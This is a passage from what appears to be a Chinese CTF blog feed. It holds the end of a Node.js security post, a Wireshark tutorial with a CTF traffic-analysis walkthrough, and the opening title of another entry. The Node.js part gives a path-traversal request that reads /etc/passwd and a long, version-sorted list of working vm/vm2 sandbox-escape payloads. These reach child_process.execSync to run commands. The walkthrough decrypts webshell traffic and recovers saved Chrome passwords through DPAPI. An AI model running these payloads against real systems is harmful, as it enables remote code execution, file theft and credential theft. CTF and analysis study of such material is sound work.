<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>.strict<span class="constructor">Equal(<span class="params">path</span>.<span class="params">posix</span>.<span class="params">normalize</span>('<span class="params">bar</span><span class="operator">/</span><span class="params">foo</span>..<span class="operator">/</span>..')</span>, 'bar');</span><br></pre></td></tr></table></figure>

<p>新的修改带来了问题，通过单步调试我们发现，可以通过<code>foo../../</code>和目录跳转字符一起注入到路径中，<code>foo../../</code>可以把变量<code>isAboveRoot</code>设置为<code>false</code>（代码161行），并且在代码135行把自己删掉；变量<code>isAboveRoot</code>为<code>false</code>的情况下，可以在<code>foo../../</code>两边设置同样数量的跳转字符，让他们同样在代码135行把自己删除，这样就可以构造出一个带有跳转字符，但是通过<code>normalizeStringPosix</code>函数标准化后又会全部自动移除的payload，这个payload配合上面提到的Send模块bug就能够成功的返回一个我们想要的物理路径，最后在Send模块中读取并返回文件。</p>
<p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p>
<p><img src="/2020/06/nodejs学习/image-20200605220006573.png" alt="image-20200605220006573"></p>
<h2 id="5-VM沙箱逃逸"><a href="#5-VM沙箱逃逸" class="headerlink" title="5.VM沙箱逃逸"></a>5.VM沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序，但是安全性让人捉急。逃逸后可获取主程序环境中的<a href="https://zhuanlan.zhihu.com/p/53135129" target="_blank" rel="noopener">环境变量</a>，然后通过各种方法导出 <code>Function</code>对象(上下文环境是主程序的)，接着借助<code>chile_process.exec()</code>就可以执行任意命令了</p>
<p>一下payload大都来自vm2的<a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">issue</a></p>
<p>vm2&lt;=3.9.2</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.9.1</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;NodeVM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> NodeVM();</span><br><span class="line"><span class="built_in">console</span>.log(vm.run(<span class="string">'('</span>+<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">trueprocess = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).ref().constructor.constructor(<span class="string">'return process'</span>)();</span><br><span class="line"><span class="built_in">console</span>.log(process.mainModule.require(<span class="string">'child_process'</span>).execSync(<span class="string">'ls'</span>).toString())&#125;+<span class="string">')()'</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>

<p>3.7.0&lt;=vm2&lt;=3.8.3</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrue<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">truetruetruegetOwnPropertyDescriptor()&#123;</span><br><span class="line">truetruetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">truetruetrue&#125;</span><br><span class="line">truetrue&#125;));</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.7.0&lt;=vm2&lt;=3.8.2</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">Symbol</span> = &#123;</span><br><span class="line">truetrue<span class="keyword">get</span> toStringTag()&#123;</span><br><span class="line">truetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)()</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Map</span>());</span><br><span class="line">true&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">truetrue<span class="built_in">Symbol</span> = &#123;&#125;;</span><br><span class="line">truetrue<span class="keyword">return</span> f(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.6.7&lt;=vm2&lt;=3.6.9</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""),"",&#123;</span></span><br><span class="line"><span class="string">	value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">		getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">			if(this.t)</span></span><br><span class="line"><span class="string">				throw Buffer.from;</span></span><br><span class="line"><span class="string">			this.t=true;</span></span><br><span class="line"><span class="string">			return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;)</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.8</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Object.defineProperty(Buffer.from(""), "", &#123;value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">		getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">			delete this.getPrototypeOf;</span></span><br><span class="line"><span class="string">			Object.defineProperty(Object.prototype, "get", &#123;</span></span><br><span class="line"><span class="string">				get()&#123;</span></span><br><span class="line"><span class="string">					delete Object.prototype.get;</span></span><br><span class="line"><span class="string">					Function.prototype.__proto__ = null;</span></span><br><span class="line"><span class="string">					throw f=&gt;f.constructor("return process")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;);</span></span><br><span class="line"><span class="string">			return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;)&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.7</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.getOwnPropertyDescriptor(</span></span><br><span class="line"><span class="string">		Buffer.from.__lookupGetter__("__proto__").call(Buffer.from),</span></span><br><span class="line"><span class="string">		"constructor").value("return process")().mainModule.require(</span></span><br><span class="line"><span class="string">		"child_process").execSync("whoami").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2=3.6.6</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.__defineGetter__(Symbol.hasInstance,()=&gt;()=&gt;true);</span></span><br><span class="line"><span class="string">Buffer.from.constructor("return process")().mainModule.require("child_process").execSync("id").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.6</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">	process = t.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"" in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.5</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Object.defineProperty(Buffer.from(""), "", &#123;get set()&#123;</span></span><br><span class="line"><span class="string">		Object.defineProperty(Object.prototype,"get",&#123;get()&#123;</span></span><br><span class="line"><span class="string">			throw x=&gt;x.constructor("return process")();</span></span><br><span class="line"><span class="string">		&#125;&#125;);</span></span><br><span class="line"><span class="string">		return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">	&#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt; =3.6.4</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Buffer.from(&#123;</span></span><br><span class="line"><span class="string">		valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">			throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">				getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">					throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;)</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.5.2</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Buffer.from(&#123;</span></span><br><span class="line"><span class="string">		valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">			throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">				getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">					throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;)</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h2><p>对于toUpperCase():</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">字符<span class="string">"ı"</span>、<span class="string">"ſ"</span> 经过<span class="keyword">to</span>UpperCase处理后结果为 <span class="string">"I"</span>、<span class="string">"S"</span></span><br></pre></td></tr></table></figure>

<p>对于toLowerCase():</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">字符<span class="string">"K"</span>经过toLowerCase处理后结果为<span class="string">"k"</span><span class="comment">(这个K不是K)</span></span><br></pre></td></tr></table></figure>

<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>wireshark</title>
    <url>/2019/11/wireshark/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h2><p>Ctrl+M 标记/取消标记<br> shift+ctrl+N/B 下/上一个被标记的数据包</p><h2 id="二、过滤器语法"><a href="#二、过滤器语法" class="headerlink" title="二、过滤器语法"></a>二、过滤器语法</h2><h3 id="1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法"><a href="#1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法" class="headerlink" title="1.捕获过滤器的BPF(Berkeley Packet Filter)语法"></a>1.捕获过滤器的BPF(Berkeley Packet Filter)语法</h3><p>限定词    说明                                                                  例子  </p><a id="more"></a>

<p>Type      指出名字或数字所代表的意义                         host、net、port  </p>
<p>Dir         指明传输方向是前往还是来自名字或数字      src、dst  </p>
<p>Proto     限定所要匹配的协议                                        ether、ip、tcp、udp、http、ftp</p>
<p>使用BPF语法创建的过滤器被称为表达式，每个表达式包含一个或多个原语。每个原语包含一个或多个限定词，然后跟着一个ID名字或者数字</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">&lt;----------原语---------&gt;</span>|<span class="string">&lt;操作符&gt;</span>|<span class="string">&lt;-----原语----&gt;</span>|</span><br><span class="line"> dst   host   192.168.0.10   &amp;&amp;    tcp   port   80</span><br><span class="line">|<span class="string">限定词</span>|<span class="string">限定词</span>|<span class="string">&lt;----ID----&gt;</span>|<span class="string">      </span>|<span class="string">限定词</span>|<span class="string">限定词</span>|<span class="string">ID</span>|</span><br></pre></td></tr></table></figure>

<p>可以使用3中逻辑运算符对原语进行组合</p>
<ul>
<li>连接运算符 &amp;&amp;</li>
<li>选择运算符 ||</li>
<li>否定运算符 !</li>
</ul>
<p>例：<br> <code>src 192.168.0.10 &amp;&amp; port 80</code><br> 只捕获源地址是192.168.0.10和源端口或目的端口是80的流量</p>
<p><code>ether host 00-1a-a0-52-e2-a0</code><br> 根据MAC地址捕获</p>
<h4 id="常用捕获过滤器表达式样例"><a href="#常用捕获过滤器表达式样例" class="headerlink" title="常用捕获过滤器表达式样例"></a>常用捕获过滤器表达式样例</h4><p> 过滤器                                      说明                        </p>
<p> tcp[13]&amp;32==32                                          设置URG位的TCP数据包<br> tcp[13]&amp;16==16                                          设置ACK位的TCP数据包<br> tcp[13]&amp;8==8                                              设置PSH位的TCP数据包<br>  tcp[13]&amp;4==4                                            设置RST位的TCP数据包<br> tcp[13]&amp;2==2                                              设置SYN位的TCP数据包<br> tcp[13]&amp;1==1                                            设置FIN位的TCP数据包<br> tcp[13]==18                                                 TCP SYN-ACK数据包<br> ether host 00:00:00:00:00:00(你的MAC地址)       流入或流出你MAC地址的流量<br> !ether host 00:00:00:00:00:00(你的MAC地址)     不流入或流出你MAC地址的流量<br> broadcast                                                    仅广播流量<br> icmp                                                           ICMP流量<br> icmp[0:2]==0x0301                               ICMP目标不可达、主机不可达<br> ip                                                                     仅IPv4流量<br> ip6                                                               仅IPv6流量<br> udp                                                         仅UDP流量                   </p>
<h3 id="2-协议域过滤器"><a href="#2-协议域过滤器" class="headerlink" title="2.协议域过滤器"></a>2.协议域过滤器</h3><p>BPF语法还提供了协议域过滤器，可以坚持协议头中的每一字节来过滤<br> 例：<br> <code>icmp[0]==3</code><br> 返回icmp包的第1个字节的整形值比较，只捕获代表目标不可达信息(类型3)的ICMP数据包</p>
<p><code>icmp[0:2]==0x0301</code><br> 捕获所有类型3代码1表示的目标不可达、主机不可达的ICMP数据包</p>
<p><code>tcp[13]&amp;4==4</code><br> 只捕获带有RST标志的TCP数据包(RST标志位在TCP包偏移13字节，00000100)</p>
<h3 id="3-显示过滤器"><a href="#3-显示过滤器" class="headerlink" title="3.显示过滤器"></a>3.显示过滤器</h3><p><a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">显示过滤器参考</a></p>
<p>常用显示过滤器</p>
<p>过滤器                                  说明<br>!tcp.port==3389                 排除RDP流量<br>tcp.flags.syn==1                具有SYN标志位的TCP数据包<br>tcp.flags.rst==1                  具有RST标志位的TCP数据包<br>!arp                                      排除ARP流量<br>http                                所有HTTP流量<br>tcp.port==23 || tcp.port==21  文本管理流量（Telnet或FTP）<br>smtp || pop || imap         文本email流量（SMTP、POP或IMAP） </p>
<h2 id="三、导出对象"><a href="#三、导出对象" class="headerlink" title="三、导出对象"></a>三、导出对象</h2><p>CTF竞赛中最常见的就是HTTP协议了，而且通信主机少容易分析。</p>
<p>利用导出对象可以快速的判断这段流量在干嘛。</p>
<p><img src="/2019/11/wireshark/image-20191103145931434.png" alt="image-20191103145931434"></p>
<p>选择HTTP…</p>
<p><img src="/2019/11/wireshark/image-20191103155828631.png" alt="image-20191103155828631"></p>
<p>很清晰的可以看到http请求。</p>
<p>很明显是个攻击者对服务器发起了sql注入攻击</p>
<p>根据它的HTTP请求，攻击者获得了那些数据我们同样也能得到。</p>
<p>而且传输过程中的所有文件都能截获。</p>
<p><img src="/2019/11/wireshark/image-20191103170050584.png" alt="image-20191103170050584"></p>
<p>通过右下角的SAVA可以完整的保存传输的文件。</p>
<h2 id="四、实战"><a href="#四、实战" class="headerlink" title="四、实战"></a>四、实战</h2><p>流量分析就是个大杂烩，什么都能加。</p>
<p>比如php语言，http，tcp/ip协议，各种加解密，隐写，sql注入等等</p>
<p>3CTF复赛的一道流量分析题</p>
<p><a href="https://pan.baidu.com/s/1rLlbRyapHrTOWUc3BfVafQ" target="_blank" rel="noopener">ok.pcapng</a> 提取码: 7y3a </p>
<p>先使用 统计-协议分级功能，查看流量包具体的有哪些协议。</p>
<p><img src="/2019/11/wireshark/image-20191107184246441.png" alt="image-20191107184246441"></p>
<p>百分之九十以上是TCP协议。</p>
<p>然后使用 文件-导出对象-HTTP 查看具体的HTTP请求和是否有文件传输</p>
<p><img src="/2019/11/wireshark/image-20191107184812717.png" alt="image-20191107184812717"></p>
<p>从这些HTTP请求中，应该是通过upload.php上传了file_5d81f9f4d22d41.67475082.php</p>
<p>然后一直与file_5d81f9f4d22d41.67475082.php进行交互。</p>
<p>利用 追踪流的功能查看完整的报文</p>
<p><img src="/2019/11/wireshark/image-20191107221151317.png" alt="image-20191107221151317"></p>
<p>选择HTTP流</p>
<p><img src="/2019/11/wireshark/image-20191107221334510.png" alt="image-20191107221334510"></p>
<p>一个标准的冰蝎马</p>
<p>冰蝎马会先从客户端得到一个加密密匙，用于流量加密。</p>
<p><img src="/2019/11/wireshark/image-20191107222451205.png" alt="image-20191107222451205"></p>
<p>我们追踪一下pass=790的流量。这里我们选择追踪TCP流，方便后面查看其他流</p>
<p><img src="/2019/11/wireshark/image-20191107223755881.png" alt="image-20191107223755881"></p>
<p>得到解密密匙  <code>d59042be6e437849</code></p>
<p>解密脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$post=<span class="string">''</span>; <span class="comment"># 放入你要解密的内容</span></span><br><span class="line">$str=openssl_decrypt($post, <span class="string">"AES128"</span>, <span class="string">'d59042be6e437849'</span>);</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$str);</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后发现第二个流的最后一个流量</p>
<p><img src="/2019/11/wireshark/image-20191111115823331.png" alt="image-20191111115823331"></p>
<p><img src="/2019/11/wireshark/image-20191111115909128.png" alt="image-20191111115909128"></p>
<p><img src="/2019/11/wireshark/image-20191111120005244.png" alt="image-20191111120005244"></p>
<p><img src="/2019/11/wireshark/image-20191107234940949.png" alt="image-20191107234940949"></p>
<p>得到一个字符串但目前不知道有什么用</p>
<p>应该在流量包中还有我们没有发现的东西</p>
<p>一、可以通过搜索关键字的16进制，二、可以通过查阅完整TCP流。</p>
<p>1.flag的16进制为 <code>666c6167</code></p>
<p><img src="/2019/11/wireshark/image-20191107235545698.png" alt="image-20191107235545698"></p>
<p>第521个包</p>
<p>2.调整流，大致浏览报文。</p>
<p>在第8个流 ，发现了不一样的东西</p>
<p><img src="/2019/11/wireshark/image-20191107235710539.png" alt="image-20191107235710539"></p>
<p>通过导出对象，把这个SQLite文件导出</p>
<p>然后这题主要是解密<code>Chrome</code>浏览器的保存密码的<code>Login Data</code>数据库（就是个SQLIte3数据库），</p>
<p>可以通过离线的方式导出密码。需要使用用户登录密码解密master key file 获得master key。再用master key解密DPAPI blob 。<br> 解这题主要需要明文密码、<code>blob</code>、<code>master key</code>。主要是322，524，654号数据包：</p>
<p>使用DB Browser for SQLite打开SQLite文件</p>
<p><img src="/2019/11/wireshark/image-20191109230229511.png" alt="image-20191109230229511"></p>
<p>导出加密后的blob</p>
<p>在最后一个流中(11)，发现返回的字符串和之前的不一样，</p>
<p>解密POST包</p>
<p><img src="/2019/11/wireshark/image-20191109233659468.png" alt="image-20191109233659468"></p>
<p>得到文件路径</p>
<p>返回的密文就是<code>master key</code></p>
<p><img src="/2019/11/wireshark/image-20191109231824174.png" alt="image-20191109231824174"></p>
<p>复制到文件或者导出对象</p>
<p>最后利用 windows password recovery来解密 </p>
<p>(没有 windows password recovery所以图是盗的<a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">yyqx</a>大佬的)</p>
<p>  选择Utils -&gt; DPAPI Decoder and Analyser -&gt; Decrypt DPAPI data blob <img src="/2019/11/wireshark/2019110711452061.png" alt="在这里插入图片描述"> </p>
<p> <img src="/2019/11/wireshark/20191107114526761.png" alt="在这里插入图片描述"> </p>
<p> <img src="/2019/11/wireshark/20191107114541741.png" alt="在这里插入图片描述"> </p>
<p> SID就是之前路径中的S-1-5-21-2127750816-4215895028-2373289296-1001<br> password就是p@ssw0rd<br> 然后解密 </p>
<p> <img src="/2019/11/wireshark/20191107114557647.png" alt="在这里插入图片描述"> </p>
<p> <img src="/2019/11/wireshark/20191107114605559.png" alt="在这里插入图片描述"> </p>
<p><a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://cloud.tencent.com/developer/news/90236" target="_blank" rel="noopener">参考文章2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp5-SQL注入漏洞分析</title>
